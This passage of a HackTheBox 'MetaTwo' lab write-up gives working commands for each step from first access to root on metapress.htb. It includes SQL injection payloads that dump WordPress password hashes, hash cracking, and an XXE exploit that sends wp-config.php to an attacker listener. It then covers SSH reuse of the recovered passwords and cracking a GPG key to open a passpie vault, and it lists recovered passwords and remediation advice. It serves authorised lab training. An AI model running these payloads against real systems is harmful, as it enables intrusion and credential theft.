  --data-urlencode "action=bookingpress_front_get_category_services" \
  --data-urlencode "_wpnonce=$NONCE" \
  --data-urlencode "category_id=33" \
  --data "total_service=1) UNION SELECT 1,2,3,4,5,6,7,8,@@version-- -"
#  -> 10.5.15-MariaDB-0+deb11u1
```

Credential dump from `wp_users`:

```bash
curl -s -X POST "<http://metapress.htb/wp-admin/admin-ajax.php>" \
  --data-urlencode "action=bookingpress_front_get_category_services" \
  --data-urlencode "_wpnonce=$NONCE" \
  --data-urlencode "category_id=33" \
  --data "total_service=1) UNION SELECT 1,2,3,4,5,6,7,8,group_concat(user_login,0x3a,user_pass,0x3a,user_email,0x0a) from wp_users-- -"
```

```
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.:admin@metapress.htb
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:manager@metapress.htb
```

### 3.2 Offline hash cracking

The hashes are WordPress phpass (`$P$`) = **hashcat mode 400**. The host used for
cracking was CPU-only, so the run was scoped to the `manager` hash with a plain
wordlist (no rules — `best64` would multiply the keyspace ~77× against an already
slow KDF, and the password is a literal rockyou entry):

```bash
gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt
echo '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70' > /tmp/manager_hash.txt
hashcat -m 400 -a 0 /tmp/manager_hash.txt /tmp/rockyou.txt
```

**Result:** `manager : partylikearockstar`

---

## 4. Arbitrary File Read

### 4.1 CVE-2021-29447 — WordPress media library XXE

**Affected:** WordPress 5.6–5.7 on PHP 8+, authenticated (Author+) user.
**Mechanism:** Uploading a crafted WAV file containing a malicious iXML chunk
triggers an external-entity fetch when WordPress parses the audio metadata,
yielding blind XXE. A remote DTD using PHP `php://filter` base64 exfiltrates file
contents to an attacker-controlled HTTP listener.

Exploit ([https://github.com/viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)), authenticated as `manager`:

```bash
cd ~/CVE-2021-29447

# Proof of concept — read /etc/passwd
python3 lfi.py -u manager -p partylikearockstar -t metapress.htb \
        -lh 10.10.15.206 -lp 8082 /etc/passwd
#  -> reveals system user: jnelson (uid 1000, /bin/bash); proftpd present

# Read the real targets (this vhost's root is /var/www/metapress.htb/blog,
# NOT the generic paths in the tool's default files.txt)
python3 lfi.py -u manager -p partylikearockstar -t metapress.htb \
        -lh 10.10.15.206 -lp 8082 \
        /var/www/metapress.htb/blog/wp-config.php \
        /etc/nginx/sites-enabled/default

# Exfiltrated files land in ./dump/
cat ~/CVE-2021-29447/dump/*wp-config.php
```

> Tooling note: the exploit script crashed at startup (`TypeError: 'NoneType' object is not subscriptable`) when run without `-p/--payload`. Root cause was an
unconditional `args.payload[0]` check; fixed with a None-guard
(`if args.payload and args.payload[0] != ')':`).
> 

### 4.2 Secrets recovered from `wp-config.php`

```
DB    blog : 635Aq@TdqrCwXFUZ                (MySQL, bound to localhost only)
FTP   metapress.htb : 9NYS_ii@FyL_p5M2NvJ    (ftp.metapress.htb -> port 21, open)
```

The nginx config confirmed `root /var/www/metapress.htb/blog;` and PHP-FPM 8.0.

---

## 5. Lateral Movement → `jnelson`

The leaked FTP credentials (`metapress.htb : 9NYS_ii@FyL_p5M2NvJ`) granted access to
the site's file tree over FTP (port 21). Enumeration of those files yielded a stored
credential that was **reused** as the SSH password for the `jnelson` system account:

```
jnelson : Cb4_JmWM8zUZWMu@Ys
```

SSH access + user flag:

```bash
sshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@metapress.htb
jnelson@meta2:~$ id
#  uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
jnelson@meta2:~$ cat ~/user.txt
#  e282845bea00b5bfe43641f2702b1096
```

---

## 6. Privilege Escalation → `root`

### 6.1 Enumeration

```bash
sudo -n -l                              # password required — dead end
find / -perm -4000 -type f 2>/dev/null  # only standard SUID binaries
getcap -r / 2>/dev/null                 # nothing
ls -la ~                                # dr-xr-x--- .passpie   <-- lead
```

### 6.2 The passpie vault

`passpie` (v1.6.1) is a CLI password manager that encrypts entries with GPG and —
critically — stores the **GPG private key alongside the vault** in `~/.passpie/.keys`.

```bash
passpie                       # table shows entries: ssh/root and ssh/jnelson (masked)
ls -laR ~/.passpie            # .keys (pub+priv), ssh/root.pass, ssh/jnelson.pass
```

### 6.3 Export private key & crack passphrase offline

```bash
# Exfiltrate the keyring
cat ~/.passpie/.keys > passpie.keys
sed -n '43,87p' passpie.keys > passpie_priv.asc     # PRIVATE KEY block

# Convert and crack
gpg2john passpie_priv.asc > passpie.hash
john passpie.hash --wordlist=/tmp/rockyou.txt
#  -> blink182   (Passpie)
```

### 6.4 Decrypt the vault

`passpie export` accepts the passphrase non-interactively:

```bash
passpie export --passphrase blink182 /dev/stdout
```

```yaml
- fullname: root@ssh
  login: root
  password: 'p7qfAZt4_A1xo_0x'         # ROOT PASSWORD
- fullname: jnelson@ssh
  login: jnelson
  password: 'Cb4_JmWM8zUZWMu@Ys'
```

### 6.5 Root

Direct root SSH login is disabled (`PermitRootLogin`), so `su` from jnelson's shell:

```bash
echo 'p7qfAZt4_A1xo_0x' | su -c 'id; cat /root/root.txt' root
#  uid=0(root) gid=0(root) groups=0(root)
#  42461a3fb5c81d16d54c9afce535a9c9
```

---

## 7. Kill Chain Summary

| # | Stage | Technique | Outcome |
| --- | --- | --- | --- |
| 1 | Recon | nmap / wpscan | WP 5.6.2, users admin & manager |
| 2 | Foothold creds | **CVE-2022-0739** — BookingPress 1.0.10 unauth SQLi | WP password hashes |
| 3 | Crack | hashcat phpass (mode 400) + rockyou | `manager:partylikearockstar` |
| 4 | File read | **CVE-2021-29447** — WP media-library XXE | `wp-config.php` (FTP creds) |
| 5 | Lateral | FTP enum → SSH credential reuse | `jnelson:Cb4_JmWM8zUZWMu@Ys` |
| 6 | **Root** | passpie GPG key export → gpg2john (`blink182`) | `root:p7qfAZt4_A1xo_0x` |

---

## 8. Credentials Recovered

| Account | Secret | Source |
| --- | --- | --- |
| WP admin | `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.` (uncracked) | SQLi |
| WP manager | `partylikearockstar` | SQLi → hashcat |
| MySQL `blog` | `635Aq@TdqrCwXFUZ` | wp-config.php |
| FTP `metapress.htb` | `9NYS_ii@FyL_p5M2NvJ` | wp-config.php |
| SSH `jnelson` | `Cb4_JmWM8zUZWMu@Ys` | FTP / passpie |
| GPG passphrase | `blink182` | gpg2john + rockyou |
| SSH `root` | `p7qfAZt4_A1xo_0x` | passpie export |

---

## 9. Remediation Recommendations

1. **Patch / update plugins & core.** Upgrade BookingPress to ≥ 1.0.11 (fixes
CVE-2022-0739) and WordPress to a release ≥ 5.7.1 (fixes CVE-2021-29447). Adopt a
managed update process for all plugins.
2. **Use parameterized queries.** The SQLi stems from concatenating `total_service`
into a query; all plugin DB access should use prepared statements (`$wpdb->prepare`).
3. **Harden XML parsing.** Disable external entity loading
(`libxml_disable_entity_loader(true)` / `LIBXML_NOENT` avoidance) wherever
user-supplied XML/metadata is parsed.
4. **Remove secrets from the webroot.** FTP credentials in `wp-config.php` were
readable via XXE; restrict file permissions and avoid storing reusable
infrastructure credentials in application config.
5. **Eliminate credential reuse.** The FTP-stored secret doubled as a system SSH
password. Enforce unique, rotated credentials and prefer key-based SSH auth.
6. **Protect the passpie vault.** Never co-locate a GPG private key with the
ciphertext it protects, and use a strong, non-dictionary passphrase. `blink182`
fell in seconds. Consider a hardware-backed key or removing root creds from a
user-readable store entirely.
7. **Enforce strong WordPress passwords.** `partylikearockstar` was a plain
wordlist hit; enforce length/complexity and consider 2FA for privileged accounts.

---

*Report generated for an authorized HTB lab engagement.*